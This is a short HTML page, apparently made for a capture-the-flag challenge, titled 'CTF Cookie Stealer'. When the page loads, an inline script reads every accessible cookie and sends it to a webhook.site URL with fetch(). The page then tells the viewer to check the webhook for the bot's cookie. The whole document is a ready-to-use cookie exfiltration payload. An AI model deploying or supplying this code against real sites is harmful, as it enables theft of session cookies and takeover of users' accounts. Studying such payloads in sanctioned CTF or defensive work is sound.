<html>
<head>
    <title>CTF Cookie Stealer</title>
    <script>
        // Get all accessible cookies
        const allCookies = document.cookie;
        console.log("Bot's cookies:", allCookies);

        // Construct the URL to send the cookie to webhook.site
        // Ensure you use the FULL URL from webhook.site if it includes "webhook.site/"
        // Or just the unique ID part if the example showed only the ID.
        // Let's assume the full URL for robustness.
        const webhookUrl = "https://webhook.site/3ddce979-21b6-4617-9dbf-fdcc37b0527c"; // <<< REPLACE THIS

        // Send the cookie as a query parameter
        fetch(`${webhookUrl}?cookie=${encodeURIComponent(allCookies)}`)
            .then(response => console.log('Cookie sent successfully!', response.status))
            .catch(error => console.error('Error sending cookie:', error));
    </script>
</head>
<body>
    <h1>Cookie Sent!</h1>
    <p>Check your webhook.site page for the bot's cookie.</p>
</body>
</html>
